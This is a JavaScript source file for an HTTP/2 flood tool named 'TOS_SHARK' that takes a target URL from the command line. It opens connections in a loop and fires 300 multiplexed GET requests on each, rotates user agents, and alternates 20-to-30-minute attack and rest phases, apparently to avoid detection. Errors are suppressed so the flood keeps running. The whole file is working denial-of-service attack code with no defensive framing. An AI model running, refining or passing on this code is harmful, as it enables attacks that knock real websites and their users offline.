const http2 = require('http2');
const https = require('https');
const { URL } = require('url');

class TOS_SHARK {
    constructor(target) {
        const url = new URL(target);
        this.host = url.hostname;
        this.isHttps = url.protocol === 'https:';
        this.target = target;
        
        this.running = true;
        this.attackActive = false;
        this.totalReqs = 0;
        this.startTime = Date.now();
        this.lastLog = Date.now();
        this.logTimer = Date.now();
        this.reqCounter = 0;
        this.attackStart = 0;
        this.breakStart = 0;
        this.currentMethod = 'H2-MULTIPLEX';
        
        this.methods = ['H2-MULTIPLEX'];
        
        this.userAgents = this.generateUserAgents();
        this.endpoints = this.generateEndpoints();
        this.cookies = this.generateCookies();
        
        this.startCycle();
    }

    generateUserAgents() {
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ];
    }

    generateEndpoints() {
        return ['/', '/api', '/static', '/users', '/data'];
    }

    generateCookies() {
        const cookies = [];
        for (let i = 0; i < 50; i++) {
            cookies.push({
                session: `session_${Math.random().toString(36).substr(2, 16)}`
            });
        }
        return cookies;
    }

    async startCycle() {
        await this.sleepRandom(100, 500);
        
        const warmupCount = 500 + Math.floor(Math.random() * 100);
        for (let i = 0; i < warmupCount; i++) {
            this.sendRandomRequest();
            if (i % 100 === 0) await this.sleepRandom(1, 10);
        }
        
        this.attackLoop();
    }

    async attackLoop() {
        while (this.running) {
            const now = Date.now();
            
            if (this.attackActive) {
                if (now - this.attackStart >= (20 * 60000) + Math.random() * (10 * 60000)) {
                    this.startBreak();
                    continue;
                }
                
                await this.attackH2Multiplex();
                
            } else {
                if (now - this.breakStart >= (20 * 60000) + Math.random() * (10 * 60000)) {
                    this.startAttack();
                    continue;
                }
                
                await this.performMaintenance();
                await this.sleepRandom(1000, 3000);
            }
            
            await this.sleepRandom(0.1, 1);
        }
    }

    startAttack() {
        this.attackActive = true;
        this.attackStart = Date.now();
    }

    startBreak() {
        this.attackActive = false;
        this.breakStart = Date.now();
        if (global.gc) global.gc();
    }

    async attackH2Multiplex() {
        try {
            const client = http2.connect(this.target);
            
            for (let i = 0; i < 300; i++) {
                this.sendH2Request(client);
                this.totalReqs++;
                this.reqCounter++;
            }
            
            setTimeout(() => {
                try {
                    client.destroy();
                } catch (e) {}
            }, 50);
            
        } catch (err) {}
    }

    sendRandomRequest() {
        this.totalReqs++;
        this.reqCounter++;
    }

    sendH2Request(client) {
        try {
            const req = client.request({
                ':method': 'GET',
                ':path': '/',
                ':authority': this.host,
                'user-agent': this.userAgents[Math.floor(Math.random() * this.userAgents.length)]
            });
            
            req.on('response', (headers) => {
                const status = headers[':status'];
                this.logStatus(status);
                req.destroy();
            });
            
            req.on('error', () => {
                this.logStatus('*.*');
                req.destroy();
            });
            
            req.end();
        } catch (err) {
            this.logStatus('*.*');
        }
    }

    async performMaintenance() {
        this.userAgents = this.generateUserAgents();
        this.cookies = this.generateCookies();
        this.endpoints = this.generateEndpoints();
    }

    logStatus(status) {
        const now = Date.now();
        if (now - this.logTimer >= 10000) {
            this.logTimer = now;
            console.log(`TØR-2M11:${this.totalReqs} ---> ${status}`);
        }
    }

    sleepRandom(min, max) {
        const duration = Math.random() * (max - min) + min;
        return new Promise(resolve => setTimeout(resolve, duration));
    }
}

if (require.main === module) {
    process.on('uncaughtException', () => {});
    process.on('unhandledRejection', () => {});
    
    if (process.argv.length < 3) {
        process.exit(1);
    }
    
    new TOS_SHARK(process.argv[2]);
    
    process.on('SIGINT', () => {
        process.exit(0);
    });
}
